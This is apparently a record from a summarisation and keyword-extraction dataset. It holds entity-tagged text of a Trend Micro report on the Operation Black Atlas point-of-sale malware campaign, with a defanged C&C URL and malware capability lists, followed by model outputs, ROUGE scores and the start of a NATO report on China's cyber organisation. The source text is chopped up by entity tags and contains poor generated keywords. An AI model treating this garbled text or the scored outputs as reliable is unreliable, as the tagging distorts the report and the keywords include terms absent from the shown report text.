97e1a56287cd86bdTSPY_POSNEWT.SMAhxxp://damcodes777[.]cc / b / co nnect/23.002cb522137f370355de9c2e3c ae7ca9a168b95ecTSPY64_POSNEWT.SMAside from just using [ORG] NewPOSThings and variants of [ORG] Alina and Kasidet [ORG] / Neutrino , we [ORG] \u2019ve also seen an old PoS threat called [ORG] Project [ORG] Hook and an installation of PwnPOS all of which have the same installation method used . With these new items , on the following page is a graph to illustrate:8Trend Micro | Operation Black Atlas : How Modular Botnets are Used in Attacks9Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksSifting through the latest samples of [GPE] NewPOSThings , [ORG] Project [ORG] Hook , PwnPOS , [ORG] Alina , and Kasidet [ORG] / Neutrino , they all indicate that the latest infections are all related : the file characteristics , the method of distribution as well as the source . Use of Known PoS Malware ThreatsCase Study : HealthcareThe most interesting observed infections affected organizations in the healthcare industry . These seem to be the unlikely target for PoS malware , but nowadays , it does n\u2019t really matter to cybercriminals as long as there is money to was downloaded directly from the browser . It would n\u2019t make sense if the user actually just tried to download it , unless there is someone else in control of the system . We mentioned earlier that the attacker makes use of several tools such as RDP scanners and password brute forcers as its initial step to find its targets and gain access to the system . This possibility is something to consider , and it is most likely the point of entry in this case since one of the endpoints in this network had an open RDP port . If a brute force attack is successful , the attacker will be in full control and will administrator [ORG] account**Samples dropped via [ORG] pcAnywhere11Trend [ORG] Micro [ORG] | [ORG] Operation [ORG] Black [ORG] Atlas : How Modular Botnets are Used in AttacksThere are a few things worth noting here:\uf0b7 We know from [ORG] the [ORG] Smart [ORG] Protection [ORG] Network that some of these files were placed into the system usingpcAnywhere . This means that the initial compromise happened in another computer within the network . Some hacking tools related to [ORG] Remote [ORG] Desktop were found in the system , which includes CRCK_PATCH , a [ORG] TermSrv patch that enables concurrent remote desktop sessions so that it is not limited to [CARDINAL] only [CARDINAL] one user accessing the computer at a time . Another hacking tool is HKTL_RDPPatcher , which allows the attacker to create a new RDP administrator account so that he would still have access to the machine even after the password has been changed . Note that [ORG] pcAnywhere and [ORG] Remote [ORG] Desktop were used here to blend with the usual administrative methods used . It could be assumed that other methods would be applied by the threat actor should the environment be using other remote desktop utilities . The use of RATs such as Spy Net enables a stealthier and more convenient approach for controlling the compromised machine . Other functionalities like password grabbing and keylogging may also be used to easily exfiltrate information . The same can be said about Gorynych , which is also capable of information theft . These [CARDINAL] two will be discussed further in the next sections . The final step in this attack is to install a PoS threat . The attacker evidently has a wide variety of POS malware in its toolset as seen in this infection . We are already familiar with the listed PoS threats above \u2013 BlackPOS , [ORG] Project [ORG] Hook , [PERSON] Posnewt , [GPE] Alina , [EVENT] Katrina . Spy Net has also been around for [DATE] a [DATE] few [DATE] years now . But what \u2019s BKDR_GORYNYCH ? Upon analysis , we figured that we \u2019ve just discovered a new player in the game of credit card theft.\uf0b7\uf0b712Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksGorynych or [ORG] Diamond [ORG] FoxTechnically , [ORG] Gorynych is not considered a PoS malware as it was n\u2019t designed to attack PoS systems . It can be likened to a bot and/or an information stealer that downloads BlackPOS to make use of its [ORG] RAM scraping functionality . So is Gorynych simply a downloader that delivers random malware to infected computers ? Apparently not . In fact , Gorynych complements BlackPOS so well that it even knows what its output file would be . The output is uploaded to its control panel to view all the dumped credit card numbers in memory . The images used for Gorynych \u2019s control panel login page are called \u201c [PERSON] Kartoxa , \u201d another name for BlackPOS.Aside from the POS plugin , there are other modules that make up this malware \u2019s entirety . These are usually downloaded from a subdirectory in the [ORG] C&C with fixed names.13Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [GPE] AttacksLocation.\\plugins\\spam.p.\\plugins\\social.p.\\plugins\\screenshot.p.\\plugins\\rdp.p.\\plugins\\POS.pDescriptionSpamSocial [FAC] MediaScreenshotRDPBlackPOS.\\plugins\\passwords.pPassword grabber ( browser).\\plugins\\mail.p.\\plugins\\ins.p.\\plugins\\homepage.p.\\plugins\\ddos.p.\\plugins\\keylogger.p.\\plugins\\ftp.pMail [ORG] GrabberInstant MessagingHomepageDDOSKeyloggerFTP [PERSON] Password [PERSON] GrabberMost of the time , these functionalities are not used altogether . The most frequently used ones have been highlighted to recognize the attacker \u2019s intent in using this malware . We already have a clue from its toolset and we are not surprised to see that the attacker is mainly concerned with passwords , key logs and credit card information . Gorynych without the plugins can do only a few things which are mostly for installation and anti - analysis . Some of these routines can be enabled or disabled depending on the builder options selected . Let \u2019s examine that in the next section . Anti - AnalysisAnti - AVAnti - SandboxAnti - VMInformation TheftBitcoin WalletOthersUAC ForcerMeltUpdateInstallUninstallDownload and Execute ( in memory or on disk)USB SpreadGiven the fact that there is a [PERSON] Bitcoin [PERSON] Wallet option , this may not come into surprise as this topic of bitcoin payment to everyday establishments have been picking up wind as of late . Diamond [PERSON] Fox [PERSON] Builder and Configuration14Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksWhen building Gorynych , the user is allowed to customize some things like the connection , security keys , installation details , and anti - analysis options . You\u2019ll notice on the installation tab that the keylogger and POS grabber are disabled by default . However , these are enabled in the infections that we see . This strengthens our theory that the target of the attacker(s ) are mainly POS systems . Once done , the configuration is saved and encrypted in either the resource section or the end of the file . It is saved in the resource by default . These are the corresponding configuration options : PanelFBPCommand and Control ServerFall Back Panel ( [ORG] Backup [ORG] CnC)15Trend [ORG] Micro [ORG] | [ORG] Operation [ORG] Black [ORG] Atlas : [ORG] How [ORG] Modular [ORG] Botnets are Used in AttacksTimeMKeyXorUsABtcAAsysABoxAVMWAbisOllyBoxieMalwrConnection TimeEncryption keyEncryption keyUser AgentBitcoin AddressAnti - SysanalyzerAnti - [GPE] VirtualBoxAnti - VMWareAnti - AnubisAnti - OllyDbgAnti - SandboxieAnti - Malwr.comNormanAnti - NormanWineRegTaskUSBInamIpatHKMLWLOGSFOLMELTKeylPoSAnti - WineDisable RegeditDisable TaskmanagerUSB SpreadInstall NameInstall PathHKCU / HKLM Startup MethodWinlogon Startup MethodStartup Folder Startup [ORG] MethodMelt [ORG] / [ORG] Self [ORG] DeleteKeyloggerPOS [ORG] RAM [ORG] Scraping16Trend [ORG] Micro [ORG] | [ORG] Operation [ORG] Black [ORG] Atlas : How Modular Botnets are Used in AttacksAgraStpeAutomatic [ORG] GrabbersStartup PersistenceC&C [ORG] CommunicationThe initial download of the keylogger and PoS plugins would have the user - agent similar to that of the browser of the affected endpoint . However , the other plugins ( ftp , rdp , mail , ins , and passwords ) are downloaded via the \u201c vb wininet \u201d user - agent . After downloading its plugins , [ORG] Gorynych reports to its server via gate.php using [ORG] HTTP [ORG] POST . This time , it uses its own user - agent that can be found in its configuration file . The parameters consist of system information used to profile the bot , mainly for identification in the [ORG] Gorynych control panel.17Trend [ORG] Micro [ORG] | [ORG] Operation [ORG] Black [ORG] Atlas : [ORG] How [ORG] Modular [ORG] Botnets are Used in [ORG] AttacksThe posted information is encrypted , but as pointed out in a blog post by Cylance , instead of using the encryption key itself , it XOR\u2019ed the entire string with its key length . This is how it looks like when decrypted : The rest of the stolen information are also uploaded via [ORG] HTTP [ORG] POST with the markers \" --Xu02=$ \" and \" --Xu02=$-- \" at the beginning and end of data.18Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [GPE] AttacksThe panel allows [ORG] LOG , [ORG] TXT , [ORG] JPG , HTML and wallet files to be uploaded via post.php . These logs are stored in these [GPE] subdirectories:.\\logs\\dump\\.\\logs\\scr\\.\\logs\\pass\\.\\logs\\ftp\\.\\logs\\ins\\.\\logs\\rdp\\.\\logs\\mail\\.\\logs\\kyl\\.\\logs\\wallet\\Credit card informationScreenshotsBrowser passwordsFTP passwordsInstant messaging passwordsRDP passwordsEmail passwordsKey logsBitcoin walletA few months earlier , a [ORG] GitHub user named [PERSON] Xyl2k posted a file upload vulnerability on [ORG] DiamondFox , which allowed a user to upload a [ORG] PHP reverse shell to the server instead of logs . This has been fixed in later versions.19Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksSpy [ORG] Net RATIt is clear that in this attack , Gorynych was used to steal sensitive information such as user credentials and key logs . But in order to maintain full control , the attackers need a Remote Access Tool which in this case was Spy Net . BuilderThe Spy Net builder is pretty straightforward . There are a wide variety of options that can be configured for [ORG] Spy [ORG] Net , including the [ORG] AutoRun , installation directory , error messages , mutex name , and process injection . The user can also choose which anti - analysis or anti - debugging features will be enabled or disabled . Aside from the [ORG] C&C server , the [ORG] RAT can also send its logs to an [ORG] FTP server if available.20Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksMalicious BehaviorThe result is similar to having your computer accessed via [ORG] Remote [ORG] Desktop [ORG] Connection , plus more . Aside from the regular backdoor routines , it is also capable of automatically grabbing passwords , keylogging , looking at the contents of your clipboard , and even spying on you using your own webcam and microphone . We listed all its capabilities in the table below : Remote ControlSurveillanceInformation TheftMiscellaneousFile ManagerCapture AudioKeyloggerDisplay Message BoxRegistry EditorCapture WebcamClipboardShutdownDOS [ORG] PromptDevice ListActive Ports ListInstalled ProgramsWindows ListService ListProcesses ListRemote [PRODUCT] DesktopDownload and [PERSON] Execute [PERSON] FileOpen [PERSON] Web [PERSON] PageRun [PERSON] CommandSend [PERSON] File and [PRODUCT] RunVictimologyGet [PRODUCT] MSN [PRODUCT] Messenger [PRODUCT] Contact ListSearch PasswordsHibernateLog - offRestartTurn Monitor OffHide Start ButtonHide Desktop IconsHide TaskbarDisable MouseReverse Mouse ButtonsHide System Tray IconsSend Chat MessageScreen CaptureHTTP ProxyUpdate ServerUninstallRename Self21Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [GPE] AttacksAs mentioned , a big part of [EVENT] Operation [EVENT] Black [EVENT] Atlas started off by scanning an [ORG] IP range , knocking on the doors to see which ports are open , and attempting to brute - force their way through remote desktop protocols . By identifying the environments that fall victim to this methodology , we found that a good majority were small - to - medium businesses ( SMBs ) that have opened these ports intentionally . Given the nature of the business , we can assume that the opened ports were most likely for outsourced IT services or so that their in - house IT admins ( if they exist ) can get back in the network from remote locations . SMBs have different challenges as they need to figure out how technology solutions can help grow their business , try to balance IT spending costs for upgrades or maintenance , or even just keep the business running . With this , it comes with no surprise that there may be some quick fixes or misconfigurations here and there that may have lesser chance of happening in a larger environment with a dedicated IT staff . Certainly , there are regional peculiarities that we have observed . For example , there was a minor hit in [GPE] Switzerland for a PwnPOS sample that they tried to plant on a terminal that was using PaniPOS [ORG] Terminal . The software , PaniPOS [ORG] Terminal , was created by a local [NORP] Swiss company called [ORG] Panipro [ORG] AG . Therefore , we know that the threat actors would not go seeking for the same kind of terminal in , say , [LOC] Latin [LOC] America . That being said , Operation Black Atlas had a wide variety of PoS threats to choose from and , for the purpose of focusing on a specific region in this write - up , we would be mentioning some observed data but most of the material would cover what we have observed within [GPE] the [GPE] United [GPE] States . The [CARDINAL] two PoS threats that may have the most significant impact would be [ORG] NewPOSThings and [ORG] Gorynych . The distribution of [GPE] NewPOSThings concentrated within [GPE] the [GPE] United [GPE] States , some in [LOC] Europe and finally a few hits in [LOC] Asia . While we were able to see infections in [LOC] Asia ( [GPE] Australia , [GPE] India , [GPE] Taiwan ) , [LOC] Europe ( [GPE] Germany , [GPE] United [GPE] Kingdom ) and [LOC] Latin [LOC] America ( [GPE] Chile ) for Gorynych , infections within [GPE] the [GPE] United [GPE] States looked quite interesting as there is a high possibility22Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] Attacksof finding both Gorynych and [GPE] NewPOSThings . We then looked into some of the affected establishments of [EVENT] Operation [EVENT] Black [EVENT] Atlas where we have spotted both indicators of Gorynych and NewPOSThings:\uf0b7 A multi - state healthcare provider and [CARDINAL] two dental clinics [CARDINAL] \uf0b7 A machine manufacturer \uf0b7 A technology company focusing on insurance services [CARDINAL] \uf0b7 A gas station that has a multi - state presence \uf0b7 A beauty supply shopNot so much can be said for finding both Gorynych and [ORG] NewPOSThings in a gas station or a beauty supply shop , but finding a bot that had information - stealing capability in the industries of insurance , manufacturing , and healthcare certainly can raise alarm . For example , any individual who walks into a dental clinic or ask services from a healthcare provider would be required to present proof of identification , fill out forms that may contain sensitive information like an individual \u2019s [ORG] Social [ORG] Security number ( [ORG] SSN ) or driver \u2019s license ID number , and even present proof of insurance . If paper forms were initially used by patients to fill in their information , then there would be manual data input to the back - end healthcare system . All of these data that require keystrokes can be easily monitored by [ORG] Gorynych \u2019s [ORG] Finally , and though we have not seen this in action , the Bitcoin wallet information theft functionality presents something as a forward looking feature . [DATE] As [DATE] early [DATE] as [DATE] later [DATE] 2013 and [DATE] early [DATE] 2014 , there have been healthcare providers who have supported payment through bitcoins to maintain significant anonymity protections for patients . Being able to tap into that anonymous financial stream would be quite lucrative for cybercriminals . AttributionNo strong attribution can be made at this time . However , the tools used for initial entry are seen , discussed and distributed in multiple hacking and security forums sourced within [DATE] the [DATE] last [DATE] two [DATE] years . In combination to the tools being used , we have observed some of the files packaged specifically for some affected environments are resemble languages spoken in [LOC] Central [LOC] Europe , like aiureala.zip ( meaning \u201c nonsense \u201d in some translations ) , as well as a file named oricenume.exe ( sometimes meaning \u201c any name \u201d ) . Aside from this , some of the uncovered log files have a time stamp format popularly used in [LOC] Europe ( dd / mm / yyyy ) . It would also be worth noting that the link to the infrastructure being used in this operation and to PwnPOS is quite strong . In our write - up of PwnPOS , the method being used for data exfiltration would be the use of email , as seen below.23Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksNotice that the email address of the recipient was also used as the administrative contact of a domain related to [ORG] Spy [ORG] Net . [CARDINAL] One other domain used in the [PERSON] Spynet was registered by \u201c [WORK_OF_ART] Petrov [WORK_OF_ART] Strong \u201d . The same name was used to register an account at a carding forum around [DATE] September 2015.24Trend Micro | Operation Black Atlas : How Modular Botnets are Used in AttacksThis does not , however , point us explicitly to anyone or any group in particular but it does highlight the following facts about this threat actor / group:\uf0b7\uf0b7The toolset would be from security forums that discuss such tools . The group or the actors have been keeping themselves updated with the recent tools , and may have a strong background in network penetration methodologies . The threat actor or group has a long history with point - of - sale - related threats , having access to different [ORG] RAM scraper families.\uf0b7 With the use of remote access [NORP] Trojans to maintain control of the compromised environment , the group maybe interested in other aspects of the network . The use of existing tools within the environment also paints a picture that the group , or the threat actors , has a big picture in mind \u2013 they are able to take the environment with the correct context , and use it for their own advantage . It also shows that enough reconnaissance has been performed so that they can use effective methodologies against the environment that they intend to compromise . However , unlike network penetration testers , they do not have restricted goals , has tricks up their sleeve to prolong their access and seek out other forms of interesting data for their own benefit . Conclusion25Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksOur research indicates there is a high possibility of the threat actors having direct remote - access to the compromised network at [CARDINAL] one point or another . As early as 2012 Data Breach Investigations Report by [NORP] Verizon , [ORG] Remote [ORG] Access services already suffered high - volume automated attacks -to quote:\u201cRemote access services ( e.g. , [ORG] VNC , RDP ) continue their rise in prevalence , accounting for 88 % of all breaches leveraging hacking techniques \u2014 more than any other vector . Remote services accessible from the entire Internet , combined with default , weak , or stolen credentials continue to plague smaller retail and hospitality organizations . \u201dEven though this has been said and acknowledged for [DATE] the [DATE] past [DATE] three [DATE] years , we can not be 100 % sure of the attackers ' methodology . It does not , however , hurt to be extra vigilant , and make sure that we do not forget what history and past reporting have taught us in allowing remote access services . And even though we may create sufficiently strong password combinations , we should make sure that our credentials do not get compromised , as well as have good password policies in place . While a good antimalware solution may provide protection , a compromised account that threat actors can use to reintroduce themselves within the environment renders those technology investments near We have also seen threat actors persistently try to introduce PoS threats through creative means \u2013 such as command- line [ORG] FTP . It is usually a given nowadays that we screen and limit items coming in through the publicly interfacing firewall , or filter out items that traverse through web / HTTP and even apply filtering . However , we seldom inspect other protocols that may be used to transfer files . A threat actor having direct remote - access to a terminal may simply launch a command - line [ORG] FTP and pull down other threats , efficiently evading the web / HTTP filtering . As efficient as getting in through remote - desktop utilities is , the same entry vector like the native [ORG] Microsoft [ORG] Remote [ORG] Desktop and Symantec PCAnywhere application would have efficient means to transfer files from one host to another . This completes not only the initial entry point but assists with lateral movement as well . Something specific to Gorynych is the bot \u2019s ability to get bitcoin wallet information - passwords stored in either RDP sessions , browsers or [ORG] FTP clients , as well as key strokes ( with its use of a keylogger ) . These types of information stealers , as well as cracking utilities and hack tools , should be given serious attention once discovered . The existence of such malicious software within the network should be tracked , endpoints where these utilities have landed should be triaged , and a process should be in place to handle this kind of incident does occur . For example , finding a keylogger on a terminal that processes insurance claims or data entry for patient information should be immediately dealt with as this could be close to a serious data breach as the attacker can now access the patient portal and take hold of patient information data . We know that [EVENT] Black [EVENT] Atlas \u2019 current operations are somewhat successful as they have been able to compromise some interesting victims that , for them , are low - hanging fruits and are easy prey . Furthermore , we believe that this method of operation would continue , improve and may still be utilized in the future by other threat actor groups . The following items have been mentioned in the [DATE] 2012 [EVENT] Data [EVENT] Breach [EVENT] Investigations [EVENT] Report by [NORP] Verizon , and we will re- state them here as they still hold true : For smaller organizations:26Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksImplement a firewall or [ORG] ACL on remote access services.\uf0b7 [CARDINAL] \uf0b7 Change default credentials of POS systems and other internet - facing devices . \uf0b7If a [ORDINAL] third party vendor is handling the [CARDINAL] two items above , make sure they \u2019ve actually done them . For large organizations : Eliminate unnecessary data ; keep tabs on what \u2019s left . Ensure essential controls are met ; regularly check that they remain so.\uf0b7 \uf0b7 \uf0b7 Monitor and mine event logs . \uf0b7Evaluate your threat landscape to prioritize your treatment strategy.27Trend Micro | Operation Black Atlas : How Modular Botnets are Used in [ORG] AttacksWe would like to add that small organizations may want to look into consider implementing some items for large organizations \u2013 essential controls on passwords and network / system security , as well as monitor and mine event logs would be very beneficial any size of an organization . We \u2019d like to also note that network segmentation and isolation of the cardholder data environment from other networks , and should be a standard practice not only for big retailers and stores . [ORG] Trend [ORG] Micro is monitoring this ongoing activity , and would make follow - up reports on this if necessary . To read up on how to enhance your security posture on your point - of - sale systems , please read [ORG] Defending [ORG] Against [ORG] PoS [ORG] RAM Scrapers : [ORG] Current [ORG] Strategies and Next - Gen [ORG] Technologies as well as our write - up on [ORG] Protecting [ORG] Point [ORG] of [ORG] Sales [ORG] Systems from [FAC] PoS [FAC] Malware . To detect , analyze , and respond to advanced malware and other attack techniques , [ORG] the [ORG] Custom Defense \u2122 by [ORG] Trend [ORG] Micro \u2122 may prove invaluable to your organizations security needs.28Trend [ORG] Micro [ORG] Incorporated , a global leader in security software , strives to make the world safe for exchanging digital information . Our innovative solutions for consumers , businesses and governments provide layered content security to protect information on mobile devices , endpoints , gateways , servers and the cloud . All of our solutions are powered by cloud - based global threat intelligence , the Trend Micro \u2122 Smart Protection Network \u2122 , and are supported by [CARDINAL] over [CARDINAL] 1,200 threat experts around the globe . For more information , visit www.trendmicro.com.t - balllogo are \u00a9 [DATE] 2015 by [ORG] Trend [ORG] Micro , Incorporated . All rights reserved . [ORG] Trend [ORG] Micro and the [ORG] Trend [ORG] Micro trademarks of [ORG] Trend [ORG] Micro , Incorporated . All other product or company names may be trademarks or registered trademarks of their owners.trademarks or [PERSON] registered10101 [PERSON] N. [PERSON] De [PERSON] Anza [PERSON] Blvd . [GPE] Cupertino , CA [CARDINAL] 95014U.S. toll free : 1 +800.228.5651 Phone : [CARDINAL] 1 +408.257.1500 Fax : [QUANTITY] 1 [QUANTITY] +408.257.2003", "generated_text": "analysis; Trend Micro; Operation Black Atlas; the attackers; PoS systems; Modular Botnets; the Black Atlas operators; pen-testing tools; access; Known PoS Malware Threats; Gorynych; Diamond Fox; Spy Net RAT; penetration; URL; Message; the network; credentials; PoS RAT; use; Known PoS Malware Threats; WannaCry; LOC; analysis.", "ref_text": "<START-1>The report provides technical analysis of the Black Atlas cybercrime operation targeting point-of-sale (POS) systems. The attackers used penetration testing tools to gain initial access to target networks through brute forcing remote desktop protocols. Once inside, they used malicious tools like password stealers and remote access trojans to maintain persistence and steal data. They employed information stealing malware called Gorynych that captured keystrokes and credentials. Gorynych also specifically targeted Bitcoin wallets and downloaded the BlackPOS RAM scraper to steal payment card data from POS systems. The modularity of Gorynych allows adding other capabilities as needed. In addition to Gorynych, the attackers planted various known POS malware like NewPOSThings, Neutrino, and Project Hook. They set up command and control infrastructure and customized malware installers for regional targets. Victims were primarily small and medium sized businesses in retail, manufacturing, and healthcare in the US and Europe. The report provides recommendations on improving security around remote access, passwords, logging, and limiting data. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.36544850498338866, "gpt3/lexical/rouge_rouge2": 0.09364548494983277, "gpt3/lexical/rouge_rougeL": 0.19933554817275748, "gpt3/lexical/rouge_rougeLsum": 0.19933554817275748, "gpt3_generated_text": ["The article discusses the findings of Trend Micro's analysis of Operation Black Atlas, a cybercriminal operation that targets Point-of-Sale (PoS) systems using modular botnets. The analysis reveals the tools and techniques used by the attackers to probe and penetrate the targeted environments. The report provides technical details on the various tools used, including Medusa Parallel Network Login Auditor, Simple SMTP Scanner, Fast SYN Scanner, nVNC Scanner package, nCrack, PCA Bruter, Fast RDP Brute GUI v2.0 package, and Sentry MBA Universal Crack/bruteforce. The report also highlights the use of known PoS malware threats such as Gorynych, Diamond Fox, and Spy Net RAT. The article emphasizes the importance of network administrators taking steps to protect their networks against these threats. Overall, the analysis provides valuable insights into the tactics and techniques employed by cybercriminals in PoS attacks."]}, {"split_name": "test", "sample_id": "test_4", "prompt_text": "Extract the keywords: This publication is a product of [EVENT] the [EVENT] NATO [EVENT] Cooperative [EVENT] Cyber [EVENT] Defence [EVENT] Centre [EVENT] of [EVENT] Excellence ( the [FAC] Centre ) . It does not necessarily reflect the policy or the opinion of the [GPE] Centre , [ORG] NATO , any agency , or any government . The [FAC] Centre may not be held responsible for any loss or harm arising from the use of information contained in this publication and is not responsible for the content of the external sources , including external websites referenced in this publication . [ORG] Digital or hard copies of this publication may be produced for internal use within [ORG] NATO and for personal or educational use when for non - profit and non - commercial purpose , provided that copies bear a full citation.www.ccdcoe.org publications@ccdcoe.orgThe NATO Cooperative Cyber Defence Centre of Excellence ( [ORG] NATO CCD COE ) is a [ORG] NATO - accredited knowledge hub , research institution , and training and exercise facility . The [ORG] Tallinn - based international military organisation focuses on interdisciplinary applied research , as well as consultations , trainings and exercises in the field of cyber security . The heart of the [FAC] Centre is a diverse group of international experts , including legal scholars , policy and strategy specialists who join forces with technology researchers , all from military , government and industry backgrounds . Membership of the [GPE] Centre is open to all Allies . As of [DATE] September [DATE] 2016 , [GPE] the [GPE] Czech [GPE] Republic , [GPE] Estonia , [GPE] France , [GPE] Germany , [GPE] Greece , [GPE] Hungary , [GPE] Italy , [GPE] Latvia , [GPE] Lithuania , [GPE] the [GPE] Netherlands , [GPE] Poland , [GPE] Slovakia , [GPE] Spain , [GPE] Turkey , [GPE] the [GPE] United [GPE] Kingdom and [GPE] the [GPE] United [GPE] States have signed on as Sponsoring Nations ( SNs ) of the [FAC] Centre . [GPE] Austria and [GPE] Finland have become [ORG] Contributing [ORG] Participants ( CPs ) \u2013 the status available for non [NORP] - [NORP] NATO nations . For more information on [ORG] NATO CCD COE , visit [ORG] the [ORG] Centre \u2019s website at url [ORG] NATO CCD COE series on national organisational models for ensuring cyber security summarise national cyber security strategy objectives and outline the division of cyber security tasks and responsibilities between agencies . In particular , the reports give an overview of the mandate , tasks and competences of the relevant organisations and of coordination between them . The scope of the reports encompasses the mandates of political and strategic cyber security governance ; national cyber incident management coordination ; military cyber defence ; and cyber aspects of crisis prevention and crisis management . Reports in this seriesNational [ORG] Cyber [ORG] Security [ORG] Organisation in [ORG] Czech [ORG] RepublicNational [ORG] Cyber [ORG] Security [ORG] Organisation in EstoniaNational Cyber Security Organisation in FranceNational Cyber Security Organisation in HungaryNational Cyber Security Organisation in ItalyNational Cyber Security Organisation in LithuaniaNational Cyber Security Organisation in the NetherlandsNational Cyber Security Organisation in SlovakiaNational Cyber Security Organisation in SpainNational Cyber Security Organisation in [ORG] the [ORG] United [ORG] KingdomNational [ORG] Cyber [ORG] Security [ORG] Organisation in the [ORG] USASeries editor : [PERSON] Kadri [PERSON] Kaska ( Researcher , [ORG] NATO [ORG] CCD [ORG] COE)Information in this study was checked for accuracy as of [DATE] August [DATE] 2016.3By [ORG] Mikk [ORG] RaudVisiting [ORG] Researcher at the [ORG] NATO [PRODUCT] CCD [DATE] COEINTRODUCTION [DATE] 51 . [GPE] CHINA \u2019S [ORG] CYBER [ORG] BACKGROUND AND RELATED CHALLENGES 61.1 . FREE INFORMATION AND FOREIGN TECHNOLOGIES SEEN AS THREATS 6 1.2 . CHINESE [ORG] VIEWS [ORG] ON [ORG] CONTROLLING [ORG] CYBERSPACE [CARDINAL] 7 [CARDINAL] 1.3 . [ORG] CHINA [ORG] VS . THE WEST AND THE UNITED STATES 8 2.1.2 . 2.1.3.CHINA \u2019S [ORG] CIVILIAN [ORG] DOCUMENTS [ORG] ON [ORG] INFORMATION [ORG] SECURITY [CARDINAL] 11 Document [CARDINAL] 27 : Opinions for Strengthening Information Security Assurance Work ( [DATE] 2003 ) [CARDINAL] 11 [ORG] National [ORG] Medium and Long Term Science and Technology Development Plan \u2013 A [DATE] 15 [DATE] - Year Strategy [ORG] 12 [ORG] State [ORG] Council \u2019s [ORG] Information [ORG] Office \u2019s [ORG] New [ORG] Policy [ORG] Opinion 13 FORMULATING A NEW NATIONAL INFORMATION SECURITY STRATEGY [CARDINAL] 143 . [GPE] CHINA \u2019S STRATEGIC CYBER GOVERNANCE [CARDINAL] 16CIVILIAN GOVERNMENT AGENCIES [CARDINAL] 16 STREAMLINING OF CYBER ADMINISTRATION [CARDINAL] 18 [CARDINAL] 3.3 . [GPE] MILITARY \u2019S [ORG] CYBER [ORG] ACTIVITIES [ORG] 19 The [NORP] Chinese military \u2019s strategic thinking on cyber [CARDINAL] 19 Impact of reforms on People \u2019s [ORG] Liberation [ORG] Army \u2019s approach to cyber [CARDINAL] 21 [ORG] General [ORG] Staff [ORG] Department \u2019s [ORG] 3rd [ORG] Department [CARDINAL] 21 [ORG] General [ORG] Staff [ORG] Department \u2019s [ORG] 4th [ORG] Department [CARDINAL] 23 The newcomer : PLA Strategic Support Force 24 3.4 . HACKTIVIST UNITS AND [ORG] CYBER [ORG] MILITIA [ORG] 263.3.1 . 3.3.2 . [CARDINAL] 3.3.3 . [CARDINAL] 3.3.4 . [CARDINAL] 3.3.5.BIBLIOGRAPHY 28ABBREVIATIONS AND ACRONYMS [CARDINAL] 344Talking about the unprecedented success story of [GPE] the People \u2019s [GPE] Republic [GPE] of [GPE] China ( hereafter simply \u2018 China \u2019 ) has almost become a clich\u00e9 . However , it is undeniable that [GPE] China has developed into a key actor in world politics , and other states can not overlook or ignore its opinion or intentions on whichever considered terrain . With its immense and growing influence over the whole planet , cyberspace is no exception . According to [ORG] Internet [ORG] Live [ORG] Stats , the number of internet users has already surpassed [CARDINAL] 3.4 [CARDINAL] billion , with [CARDINAL] 721 [CARDINAL] million coming from [ORG] China.1 [ORG] Naturally , [GPE] China is increasingly dependent on various cyber assets and the [NORP] Chinese authorities have reacted accordingly . We have witnessed a growing emphasis on cyber security measures , as well as an increase in the country \u2019s readiness to take advantage of the opportunities that the internet provides , and to respond to the threats it poses to national security . With the largest population in the world , [GPE] China holds a sizeable pool of experts with potential value for the government and its cyber operations . Understanding [GPE] China \u2019s cyber structure , strategies and organisation is not an easy task . The [NORP] Chinese have not established an exhaustive approach to cyber issues in the form of a strategy clearly outlining the country \u2019s cyber objectives and their execution . This has created much uncertainty for both [GPE] China \u2019s domestic environment and , understandably , outsiders for whom the complex hierarchies , command structures and various defence papers are very confusing . Even though the [NORP] Chinese do not seem to mind a certain degree of mystery , a step suggesting their increasing desire to manage their cyber operations more efficiently can be seen in the recent creation of [ORG] the [ORG] Central [ORG] Internet [ORG] Security [ORG] and [ORG] Information [ORG] Leading [ORG] Group , for which [PERSON] Xi [PERSON] Jinping has taken personal responsibility to define [GPE] China \u2019s cyber strategy . This also stands as a good example of how the [NORP] Chinese understand cyber as something strongly integrated with society , and do not separate it from the general flow of governance . Admittedly , the challenges that originate from such a distinctive approach to cyber have great potential to affect the Western world \u2019s activities in cyberspace for a number of reasons . [ORDINAL] First , the way in which the world \u2019s biggest internet community is governed influences the overall development of the internet worldwide . Granting [ORG] netizens the opportunity to become a part of the online world free from physical constraints , or restricting their access to information and using the internet as a tool against dissent are the [CARDINAL] two fundamentally different choices facing the [NORP] Chinese government . As it has so far stuck to the [ORDINAL] second option , [GPE] China \u2019s participation in the global internet community has been greatly hindered , and thus countless opportunities for cooperation have been missed . [ORDINAL] Secondly , there is significant evidence that the [NORP] Chinese government , together with the [NORP] Chinese military , private corporations , and unaffiliated citizens , conduct intrusions against major [NORP] Western powers as well as in the neighbouring region [DATE] every [DATE] day , targeting academia , industry and government facilities for the purpose of amassing technological secrets.2 For example , the [NORP] Chinese have , among other high - tech weapon system designs , obtained those of the [PRODUCT] F-35 stealth fighter \u2013 [GPE] America \u2019s most expensive military investment ever.3 The underlying purpose of these activities is to gain advantage in the economic , political and military fields , and often simply show the extensive harm they are capable of causing should the need arise.1 Internet Live Stats compiles data from [CARDINAL] six major reliable agencies , including [ORG] the [ORG] International [ORG] Telecommunications [ORG] Unit and [ORG] the [ORG] World [ORG] Bank . See more at \u2018 China Internet Users . \u2019 Internet Live Stats , [DATE] 2016 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url Internet Live Stats compiles data from [CARDINAL] six major reliable agencies , including [ORG] the [ORG] International [ORG] Telecommunications [ORG] Unit and [ORG] the [ORG] World [ORG] Bank . [CARDINAL] 2 [PERSON] Richard [PERSON] Clarke , a former special advisor on cyber security to President [PERSON] George [PERSON] W. [PERSON] Bush , illustrates the situation rather comprehensively , 